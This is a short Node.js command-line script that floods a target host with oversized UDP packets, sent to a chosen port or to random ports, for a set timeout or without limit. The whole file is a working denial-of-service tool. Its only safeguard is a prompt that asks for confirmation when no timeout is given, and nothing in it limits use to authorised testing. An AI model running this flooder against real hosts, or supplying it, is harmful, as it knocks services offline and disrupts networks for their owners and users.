let program = require('commander');
const Confirm = require('prompt-confirm');

let programHelp = program
    .version('0.1.0')
    .option('-h, --host <host>', 'Host Name/IP')
    .option('-p, --port [port]', 'If not defined, program will use random ports.', parseInt)
    .option('-t, --timeout [timeout]', 'Timeout in millisecond. If not defined, it will be unlimited.', parseInt);

programHelp.parse(process.argv);

if (program.host) {

    if (!program.timeout) {
        new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ')
            .ask(function (answer) {
                console.log(answer);
                if (!answer) {
                    console.log('Ok, run program again with --timeout parameter.');
                    process.stdin.destroy();
                } else {
                    udpFlood(program.host, program.port, null);
                }
            });
    } else {
        udpFlood(program.host, program.port, program.timeout);
    }

} else {
    programHelp.help();
}

function udpFlood(host, port, timeout) {

    let HOST = host;
    let dgram = require('dgram');
    let client = dgram.createSocket('udp4');

    let output = "";
    for (var i = 65500; i >= 0; i--) {
        output += "X";
    }
    let startTime = new Date();
    while (1) {

        if (timeout) {
            var nowTime = new Date();
            if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
                break;
            }
        }

        let message = Buffer.from(output);

        (function (PORT) {
            client.send(message, 0, message.length, PORT, HOST, function (err, bytes) {
                if (err) throw err;
                console.log('UDP message sent to ' + HOST + ':' + PORT);
            });
        })(port || Math.floor(Math.random() * (65535) + 1));
    }
}